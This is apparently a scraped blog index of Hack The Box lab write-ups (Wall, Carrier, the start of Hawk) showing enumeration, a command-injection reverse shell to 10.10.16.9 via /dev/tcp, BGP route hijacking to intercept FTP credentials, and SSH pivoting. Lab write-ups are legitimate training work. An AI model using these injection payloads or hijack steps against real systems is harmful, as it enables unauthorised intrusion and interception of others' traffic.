SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.157/aa.php Total requests: 5 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 200 0 L 1 W 1 Ch \u0026#34;GET - GET\u0026#34; 000000002: 200 0 L 0 W 0 Ch \u0026#34;HEAD - HEAD\u0026#34; 000000004: 405 9 L 35 W 307 Ch \u0026#34;TRACE - TRACE\u0026#34; 000000003: 200 0 L 1 W 1 Ch \u0026#34;POST - POST\u0026#34; 000000005: 200 0 L 1 W 1 Ch \u0026#34;OPTIONS - OPTIONS\u0026#34; Total time: 0 Processed Requests: 5 Filtered Requests: 0 Requests/sec.: 0 └─$ wfuzz -c -u http://10.10.10.157/panel.php -d \u0026#39;FUZZ=test\u0026#39; -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt --hw 7 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.157/panel.php Total requests: 6453 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000002631: 403 11 L 32 W 296 Ch \u0026#34;hostname\u0026#34;` 000003612: 403 11 L 32 W 296 Ch \u0026#34;nc\u0026#34;` 000004040: 403 11 L 32 W 296 Ch \u0026#34;passwd\u0026#34; Each endpoint returns 403 when trying each param └─$ curl http://10.10.10.157 -d \u0026#34;nc\u0026#34; \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;403 Forbidden\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Forbidden\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;You don\u0026#39;t have permission to access / on this server.\u0026lt;br /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.29 (Ubuntu) Server at 10.10.10.157 Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; monitoring returns http basic auth Tried default passwords, but nothing works But when I tried fuzzing, we receive 200 on POST └─$ wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ -u http://10.10.10.157/monitoring/ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.157/monitoring/ Total requests: 5 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 401 14 L 54 W 459 Ch \u0026#34;GET - GET\u0026#34;` 000000002: 401 0 L 0 W 0 Ch \u0026#34;HEAD - HEAD\u0026#34;` 000000003: 200 5 L 21 W 154 Ch \u0026#34;POST - POST\u0026#34;` 000000005: 200 0 L 0 W 0 Ch \u0026#34;OPTIONS - OPTIONS\u0026#34;` 000000004: 405 9 L 35 W 312 Ch \u0026#34;TRACE - TRACE\u0026#34;` Total time: 0.695538 Processed Requests: 5 Filtered Requests: 0 Requests/sec.: 7.188679 If we curl, we see another endpoint └─$ curl -XPOST http://10.10.10.157/monitoring/ \u0026lt;h1\u0026gt;This page is not ready yet !\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;We should redirect you to the required page !\u0026lt;/h2\u0026gt; \u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;0; URL=\u0026#39;/centreon\u0026#39;\u0026#34; /\u0026gt; Centreon v. 19.04.0 We have an exploit But we need creds Default creds didn\u0026rsquo;t work Let\u0026rsquo;s try to bruteforce User Root ","date":"October 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/wall/images/wall.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/wall/","summary":"Wall Enumeration nmap └─$ nmap -Pn -p- 10.10.10.157 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 19:21 BST Warning: 10.10.10.157 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.157 (10.10.10.157) Host is up (0.17s latency). Not shown: 46442 filtered tcp ports (no-response), 19091 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 119.","tags":["HTB"],"title":"[HTB] Machine: Wall"},{"categories":null,"contents":"Carrier Enumeration nmap └─$ nmap -Pn -p- 10.10.10.105 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:29 BST Nmap scan report for 10.10.10.105 (10.10.10.105) Host is up (0.10s latency). Not shown: 65450 filtered tcp ports (no-response), 83 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 26.37 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.105 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:35 BST Nmap scan report for 10.10.10.105 (10.10.10.105) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA) | 256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA) |_ 256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Login | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.66 seconds └─$ sudo nmap -sU -Pn -p- 10.10.10.105 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:36 BST Warning: 10.10.10.105 giving up on port because retransmission cap hit (10). Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 14.39% done; ETC: 19:38 (0:01:59 remaining) Nmap scan report for 10.10.10.105 (10.10.10.105) Host is up (0.10s latency). Not shown: 65386 open|filtered udp ports (no-response), 148 closed udp ports (port-unreach) PORT STATE SERVICE 161/udp open snmp Nmap done: 1 IP address (1 host up) scanned in 145.06 seconds Web server gobuster └─$ gobuster dir -u http://10.10.10.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.105 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.105/img/] /tools (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.105/tools/] /.php (Status: 403) [Size: 291] /doc (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.105/doc/] /index.php (Status: 200) [Size: 1509] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.105/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.105/js/] /tickets.php (Status: 302) [Size: 0] [--\u0026gt; /index.php] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.105/fonts/] /dashboard.php (Status: 302) [Size: 0] [--\u0026gt; /index.php] /debug (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.105/debug/] /diag.php (Status: 302) [Size: 0] [--\u0026gt; /index.php] /.php (Status: 403) [Size: 291] snmp └─$ snmpwalk -c public -v 1 10.10.10.105 SNMPv2-SMI::mib-2.47.1.1.1.1.11 = STRING: \u0026#34;SN#NET_45JDX23\u0026#34; End of MIB Foothold We find 2 interesting files in /doc pdf indicates that admin\u0026rsquo;s default password is serial number Using that hint, we can try to login using result from snmp admin:NET_45JDX23 Tickets Diagnostics Results from diagnostics page looks identical to top\u0026rsquo;s output Parameter check is base64-encoded Let\u0026rsquo;s play with it We see the command ps waux | grep $(\u0026lt;process-base64-encoded\u0026gt; | base64 -d) | grep -v grep Let\u0026rsquo;s get a reverse shell test;bash -c \u0026quot;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.9/6666 0\u0026gt;\u0026amp;1\u0026quot; Root We saw a ticket regarding route leakage Let\u0026rsquo;s check ip We have 3 root@r1:~# ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 8: eth0@if9: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 00:16:3e:d9:04:ea brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.99.64.2/24 brd 10.99.64.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::216:3eff:fed9:4ea/64 scope link valid_lft forever preferred_lft forever 10: eth1@if11: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 00:16:3e:8a:f2:4f brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.78.10.1/24 brd 10.78.10.255 scope global eth1 valid_lft forever preferred_lft forever inet6 fe80::216:3eff:fe8a:f24f/64 scope link valid_lft forever preferred_lft forever 12: eth2@if13: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 00:16:3e:20:98:df brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.78.11.1/24 brd 10.78.11.255 scope global eth2 valid_lft forever preferred_lft forever inet6 fe80::216:3eff:fe20:98df/64 scope link valid_lft forever preferred_lft forever Routes root@r1:~# ip r default via 10.99.64.1 dev eth0 onlink 10.78.10.0/24 dev eth1 proto kernel scope link src 10.78.10.1 10.78.11.0/24 dev eth2 proto kernel scope link src 10.78.11.1 10.99.64.0/24 dev eth0 proto kernel scope link src 10.99.64.2 10.100.10.0/24 via 10.78.10.2 dev eth1 proto zebra 10.100.11.0/24 via 10.78.10.2 dev eth1 proto zebra 10.100.12.0/24 via 10.78.10.2 dev eth1 proto zebra 10.100.13.0/24 via 10.78.10.2 dev eth1 proto zebra 10.100.14.0/24 via 10.78.10.2 dev eth1 proto zebra 10.100.15.0/24 via 10.78.10.2 dev eth1 proto zebra 10.100.16.0/24 via 10.78.10.2 dev eth1 proto zebra 10.100.17.0/24 via 10.78.10.2 dev eth1 proto zebra 10.100.18.0/24 via 10.78.10.2 dev eth1 proto zebra 10.100.19.0/24 via 10.78.10.2 dev eth1 proto zebra 10.100.20.0/24 via 10.78.10.2 dev eth1 proto zebra 10.120.10.0/24 via 10.78.11.2 dev eth2 proto zebra 10.120.11.0/24 via 10.78.11.2 dev eth2 proto zebra 10.120.12.0/24 via 10.78.11.2 dev eth2 proto zebra 10.120.13.0/24 via 10.78.11.2 dev eth2 proto zebra 10.120.14.0/24 via 10.78.11.2 dev eth2 proto zebra 10.120.15.0/24 via 10.78.11.2 dev eth2 proto zebra 10.120.16.0/24 via 10.78.11.2 dev eth2 proto zebra 10.120.17.0/24 via 10.78.11.2 dev eth2 proto zebra 10.120.18.0/24 via 10.78.11.2 dev eth2 proto zebra 10.120.19.0/24 via 10.78.11.2 dev eth2 proto zebra 10.120.20.0/24 via 10.78.11.2 dev eth2 proto zebra bgpd.conf root@r1:~# cat /etc/quagga/bgpd.conf ! ! Zebra configuration saved from vty ! 2018/07/02 02:14:27 ! route-map to-as200 permit 10 route-map to-as300 permit 10 ! router bgp 100 bgp router-id 10.255.255.1 network 10.101.8.0/21 network 10.101.16.0/21 redistribute connected neighbor 10.78.10.2 remote-as 200 neighbor 10.78.11.2 remote-as 300 neighbor 10.78.10.2 route-map to-as200 out neighbor 10.78.11.2 route-map to-as300 out ! line vty ! We are in AS100 - 10.99.64.2 AS200 - 10.78.10.2 AS300 - 10.78.11.2 Ticket was reporting about ftp issue on 10.120.15.0/24 10.120.0.0/15 goes to 10.78.11.2 - AS300 So let\u0026rsquo;s ping the subnet root@r1:~# for i in {1..254}; do (ping -c 1 10.120.15.$i | grep \u0026#34;bytes from\u0026#34; \u0026amp;); done; 64 bytes from 10.120.15.1: icmp_seq=1 ttl=64 time=0.116 ms 64 bytes from 10.120.15.10: icmp_seq=1 ttl=63 time=0.063 ms We have a nc on the box to perform port scan We saw 10.120.15.10, which is probably the address that has ftp root@r1:~# nc -zv 10.120.15.10 1-65535 2\u0026gt;\u0026amp;1 | grep -v refused Connection to 10.120.15.10 21 port [tcp/ftp] succeeded! Connection to 10.120.15.10 22 port [tcp/ssh] succeeded! Connection to 10.120.15.10 53 port [tcp/domain] succeeded! Since we saw BGP configs, it indicates that we can perform BGP Hijacking BGP hijacking is when attackers maliciously reroute Internet traffic. Attackers accomplish this by falsely announcing ownership of groups of IP addresses, called IP prefixes, that they do not actually own, control, or route to. To perform it we need to: Offer a more specific route by announcing a smaller range of IP addresses than other ASes had previously announced. Offer a shorter route to certain blocks of IP addresses. Additionally, not just anyone can announce BGP routes to the larger Internet. In order for a BGP hijack to occur, the announcement must be made by the operator of an AS, or by a threat actor who has compromised an AS (the second case is more rare). Since BGP always favors the shortest, most specific path to the desired IP address. Before that, we have a restore script which returns all changes to bgp back to default We can make it not executable while playing around with bgp root@r1:~# crontab -l ... */10 * * * * /opt/restore.sh root@r1:~# cat /opt/restore.sh #!/bin/sh systemctl stop quagga killall vtysh cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf systemctl start quagga root@r1:~# root@r1:~# ls -lha /opt/restore.sh -rwxr-xr-x 1 root root 175 Jul 2 2018 /opt/restore.sh So right now, we can advertise 10.120.15.0/25 to AS200 Since it\u0026rsquo;s more specific route it will get advertized to AS200 But we won\u0026rsquo;t share it with AS300 so that routes still works (so AS300 won\u0026rsquo;t send us traffic) We only intercept AS200\u0026rsquo;s traffic root@r1:~# chmod -x /opt/restore.sh root@r1:~# vtysh Hello, this is Quagga (version 0.99.24.1). Copyright 1996-2005 Kunihiro Ishiguro, et al. r1# show running-config Building configuration... Current configuration: ! ! interface eth0 ipv6 nd suppress-ra no link-detect ! interface eth1 ipv6 nd suppress-ra no link-detect ! interface eth2 ipv6 nd suppress-ra no link-detect ! interface lo no link-detect ! router bgp 100 bgp router-id 10.255.255.1 network 10.101.8.0/21 network 10.101.16.0/21 redistribute connected neighbor 10.78.10.2 remote-as 200 neighbor 10.78.10.2 route-map to-as200 out neighbor 10.78.11.2 remote-as 300 neighbor 10.78.11.2 route-map to-as300 out ! route-map to-as200 permit 10 ! route-map to-as300 permit 10 ! ip forwarding ! line vty ! end We can check summary r1# sh ip bgp summary BGP router identifier 10.255.255.1, local AS number 100 RIB entries 53, using 5936 bytes of memory Peers 2, using 9136 bytes of memory Neighbor V AS MsgRcvd MsgSent TblVer InQ OutQ Up/Down State/PfxRcd 10.78.10.2 4 200 12 14 0 0 0 00:07:48 22 10.78.11.2 4 300 11 17 0 0 0 00:07:47 22 Total number of neighbors 2 To see specific network\u0026rsquo;s information r1# sh ip bgp 10.120.15.0/24 BGP routing table entry for 10.120.15.0/24 Paths: (2 available, best #1, table Default-IP-Routing-Table) Advertised to non peer-group peers: 10.78.10.2 300 10.78.11.2 from 10.78.11.2 (10.255.255.3) Origin IGP, metric 0, localpref 100, valid, external, best Last update: Tue Oct 24 18:00:17 2023 200 300 10.78.10.2 from 10.78.10.2 (10.255.255.2) Origin IGP, localpref 100, valid, external Last update: Tue Oct 24 18:00:16 2023 Okay, let\u0026rsquo;s start First we create network we advertise r1# conf t r1(config)# router bgp 100 r1(config-router)# network 10.120.15.0/25 r1(config-router)# end Now, we need to cut off advertising to AS300 and advertise to AS200 We also have to tell AS200 not to advertise our route to 10.120.15.0/25 r1# conf t r1(config)# ip prefix-list bgp-hijack permit 10.120.15.0/25 r1(config)# route-map to-as200 permit 10 r1(config-route-map)# match ip address prefix-list bgp-hijack r1(config-route-map)# set community no-export r1(config-route-map)# route-map to-as200 permit 20 r1(config-route-map)# route-map to-as300 deny 10 r1(config-route-map)# match ip address prefix-list bgp-hijack r1(config-route-map)# route-map to-as300 permit 20 r1(config-route-map)# exit r1(config)# exit Final config r1# show running-config Building configuration... Current configuration: ! ! interface eth0 ipv6 nd suppress-ra no link-detect ! interface eth1 ipv6 nd suppress-ra no link-detect ! interface eth2 ipv6 nd suppress-ra no link-detect ! interface lo no link-detect ! router bgp 100 bgp router-id 10.255.255.1 network 10.101.8.0/21 network 10.101.16.0/21 network 10.120.15.0/25 redistribute connected neighbor 10.78.10.2 remote-as 200 neighbor 10.78.10.2 route-map to-as200 out neighbor 10.78.11.2 remote-as 300 neighbor 10.78.11.2 route-map to-as300 out ! ip prefix-list bgp-hijack seq 5 permit 10.120.15.0/25 ! route-map to-as200 permit 10 match ip address prefix-list bgp-hijack set community no-export ! route-map to-as200 permit 20 ! route-map to-as300 deny 10 match ip address prefix-list bgp-hijack ! route-map to-as300 permit 20 ! ip forwarding ! line vty ! end If we compare routes, we see that we only advertise 10.120.15.0/24 to 10.78.10.2 r1# show ip bgp neighbors 10.78.10.2 advertised-routes BGP table version is 0, local router ID is 10.255.255.1 Status codes: s suppressed, d damped, h history, * valid, \u0026gt; best, = multipath, i internal, r RIB-failure, S Stale, R Removed Origin codes: i - IGP, e - EGP, ? - incomplete Network Next Hop Metric LocPrf Weight Path *\u0026gt; 10.78.10.0/24 10.78.10.1 0 32768 ? *\u0026gt; 10.78.11.0/24 10.78.10.1 0 32768 ? *\u0026gt; 10.99.64.0/24 10.78.10.1 0 32768 ? *\u0026gt; 10.101.8.0/21 10.78.10.1 0 32768 i *\u0026gt; 10.101.16.0/21 10.78.10.1 0 32768 i *\u0026gt; 10.120.10.0/24 10.78.10.1 0 300 i *\u0026gt; 10.120.11.0/24 10.78.10.1 0 300 i *\u0026gt; 10.120.12.0/24 10.78.10.1 0 300 i *\u0026gt; 10.120.13.0/24 10.78.10.1 0 300 i *\u0026gt; 10.120.14.0/24 10.78.10.1 0 300 i *\u0026gt; 10.120.15.0/24 10.78.10.1 0 300 i *\u0026gt; 10.120.15.0/25 10.78.10.1 0 32768 i *\u0026gt; 10.120.16.0/24 10.78.10.1 0 300 i *\u0026gt; 10.120.17.0/24 10.78.10.1 0 300 i *\u0026gt; 10.120.18.0/24 10.78.10.1 0 300 i *\u0026gt; 10.120.19.0/24 10.78.10.1 0 300 i *\u0026gt; 10.120.20.0/24 10.78.10.1 0 300 i Total number of prefixes 17 r1# show ip bgp neighbors 10.78.11.2 advertised-routes BGP table version is 0, local router ID is 10.255.255.1 Status codes: s suppressed, d damped, h history, * valid, \u0026gt; best, = multipath, i internal, r RIB-failure, S Stale, R Removed Origin codes: i - IGP, e - EGP, ? - incomplete Network Next Hop Metric LocPrf Weight Path *\u0026gt; 10.78.10.0/24 10.78.11.1 0 32768 ? *\u0026gt; 10.78.11.0/24 10.78.11.1 0 32768 ? *\u0026gt; 10.99.64.0/24 10.78.11.1 0 32768 ? *\u0026gt; 10.100.10.0/24 10.78.11.1 0 200 i *\u0026gt; 10.100.11.0/24 10.78.11.1 0 200 i *\u0026gt; 10.100.12.0/24 10.78.11.1 0 200 i *\u0026gt; 10.100.13.0/24 10.78.11.1 0 200 i *\u0026gt; 10.100.14.0/24 10.78.11.1 0 200 i *\u0026gt; 10.100.15.0/24 10.78.11.1 0 200 i *\u0026gt; 10.100.16.0/24 10.78.11.1 0 200 i *\u0026gt; 10.100.17.0/24 10.78.11.1 0 200 i *\u0026gt; 10.100.18.0/24 10.78.11.1 0 200 i *\u0026gt; 10.100.19.0/24 10.78.11.1 0 200 i *\u0026gt; 10.100.20.0/24 10.78.11.1 0 200 i *\u0026gt; 10.101.8.0/21 10.78.11.1 0 32768 i *\u0026gt; 10.101.16.0/21 10.78.11.1 0 32768 i Total number of prefixes 16 Now we intercept the traffic root@r1:~# tcpdump -i any -nnXSs 0 \u0026#39;port 21\u0026#39; -w out.pcap ^Croot@r1:~# ls -lha total 40K drwx------ 1 root root 196 Oct 24 18:36 . drwxr-xr-x 1 root root 140 Jun 22 2018 .. -rw-r--r-- 1 root root 3.1K Jul 2 2018 .bashrc drwx------ 1 root root 40 Jul 2 2018 .cache drwxr-xr-x 1 root root 0 Jul 2 2018 .nano -rw------- 1 root root 169 Oct 24 18:38 nohup.out -rw-r--r-- 1 root root 11K Oct 24 18:49 out.pcap -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 66 Jul 2 2018 .selected_editor drwx------ 1 root root 52 Jul 2 2018 .ssh -rw-r--r-- 1 root root 0 Jul 3 2018 test_intercept.pcap lrwxrwxrwx 1 root root 18 Sep 30 2022 user.txt -\u0026gt; /opt/flag/user.txt -rw------- 1 root root 5.1K Sep 30 2022 .viminfo root@r1:~# base64 -w0 out.pcap 1MOyoQIABAAAAAAAAAAAAAAABABxAAAAYRE4ZelbCQBMAAAATAAAAAA... Copy output to your system └─$ base64 -d dump \u0026gt; dump.pcap Open wireshark We can ssh using the creds root@r1:~# ssh root@10.120.15.10 root@10.120.15.10\u0026#39;s password: Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Oct 24 18:53:17 UTC 2023 System load: 0.01 Users logged in: 1 Usage of /: 63.6% of 8.73GB IP address for ens160: 10.10.10.105 Memory usage: 36% IP address for lxdbr0: 10.99.64.1 Swap usage: 0% IP address for lxdbr1: 10.120.15.10 Processes: 282 * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 4 packages can be updated. 0 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Oct 24 18:51:52 2023 from 10.10.16.9 root@carrier:~# ","date":"October 22, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/carrier/images/carrier.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/carrier/","summary":"Carrier Enumeration nmap └─$ nmap -Pn -p- 10.10.10.105 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:29 BST Nmap scan report for 10.10.10.105 (10.10.10.105) Host is up (0.10s latency). Not shown: 65450 filtered tcp ports (no-response), 83 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 26.37 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.","tags":["HTB","injection","command-injection","bgp-hijack","snmp","snmpwalk","pivot","container","tcpdump","lxc","lxd","ssh"],"title":"[HTB] Machine: Carrier"},{"categories":null,"contents":"Hawk Enumeration nmap └─$ nmap -Pn -p- 10.10.10.102 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-22 17:48 BST Stats: 0:09:35 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 78.74% done; ETC: 18:00 (0:02:35 remaining) Nmap scan report for 10.10.10.102 (10.10.10.102) Host is up (0.15s latency). Not shown: 65529 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 5435/tcp open sceanics 8082/tcp open blackice-alerts 9092/tcp open XmlIpcRegSvc └─$ nmap -Pn -p21,22,80,5435,8082,9092 -sC -sV 10.10.10.102 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-22 18:04 BST Nmap scan report for 10.10.10.102 (10.10.10.102) Host is up (0.15s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.16.9 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxr-xr-x 2 ftp ftp 4096 Jun 16 2018 messages 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA) | 256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA) |_ 256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Welcome to 192.168.56.103 | 192.168.56.103 |_http-generator: Drupal 7 (http://drupal.org) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt 5435/tcp open tcpwrapped 8082/tcp open http H2 database http console |_http-title: H2 Console 9092/tcp open XmlIpcRegSvc? 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9092-TCP:V=7.94%I=7%D=10/22%Time=65355639%P=x86_64-pc-linux-gnu%r(N SF:ULL,45E,\u0026#34;\\0\\0\\0\\0\\0\\0\\0\\x05\\x009\\x000\\x001\\x001\\x007\\0\\0\\0F\\0R\\0e\\0m\\0o SF:\\0t\\0e\\0\\x20\\0c\\0o\\0n\\0n\\0e\\0c\\0t\\0i\\0o\\0n\\0s\\0\\x20\\0t\\0o\\0\\x20\\0t\\0h\\0 SF:i\\0s\\0\\x20\\0s\\0e\\0r\\0v\\0e\\0r\\0\\x20\\0a\\0r\\0e\\0\\x20\\0n\\0o\\0t\\0\\x20\\0a\\0l\\ SF:0l\\0o\\0w\\0e\\0d\\0,\\0\\x20\\0s\\0e\\0e\\0\\x20\\0-\\0t\\0c\\0p\\0A\\0l\\0l\\0o\\0w\\0O\\0t SF:\\0h\\0e\\0r\\0s\\xff\\xff\\xff\\xff\\0\\x01`\\x05\\0\\0\\x01\\xd8\\0o\\0r\\0g\\0\\.\\0h\\x00 SF:2\\0\\.\\0j\\0d\\0b\\0c\\0\\.\\0J\\0d\\0b\\0c\\0S\\0Q\\0L\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\0o\\0n\\0 SF::\\0\\x20\\0R\\0e\\0m\\0o\\0t\\0e\\0\\x20\\0c\\0o\\0n\\0n\\0e\\0c\\0t\\0i\\0o\\0n\\0s\\0\\x20\\ SF:0t\\0o\\0\\x20\\0t\\0h\\0i\\0s\\0\\x20\\0s\\0e\\0r\\0v\\0e\\0r\\0\\x20\\0a\\0r\\0e\\0\\x20\\0n SF:\\0o\\0t\\0\\x20\\0a\\0l\\0l\\0o\\0w\\0e\\0d\\0,\\0\\x20\\0s\\0e\\0e\\0\\x20\\0-\\0t\\0c\\0p\\0 SF:A\\0l\\0l\\0o\\0w\\0O\\0t\\0h\\0e\\0r\\0s\\0\\x20\\0\\[\\x009\\x000\\x001\\x001\\x007\\0-\\x SF:001\\x009\\x006\\0\\]\\0\\n\\0\\t\\0a\\0t\\0\\x20\\0o\\0r\\0g\\0\\.\\0h\\x002\\0\\.\\0m\\0e\\0s SF:\\0s\\0a\\0g\\0e\\0\\.\\0D\\0b\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\0o\\0n\\0\\.\\0g\\0e\\0t\\0J\\0d\\0b SF:\\0c\\0S\\0Q\\0L\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\0o\\0n\\0\\(\\0D\\0b\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\ SF:0o\\0n\\0\\.\\0j\\0a\\0v\\0a\\0:\\x003\\x004\\x005\\0\\)\\0\\n\\0\\t\\0a\\0t\\0\\x20\\0o\\0r\\0 SF:g\\0\\.\\0h\\x002\\0\\.\\0m\\0e\\0s\\0s\\0a\\0g\\0e\\0\\.\\0D\\0b\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\0 SF:o\\0n\\0\\.\\0g\\0e\\0t\\0\\(\\0D\\0b\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\0o\\0n\\0\\.\\0j\\0a\\0v\\0a\\ SF:0:\\x001\\x007\\x009\\0\\)\\0\\n\\0\\t\\0a\\0t\\0\\x20\\0o\\0r\\0g\\0\\.\\0h\\x002\\0\\.\\0m\\0 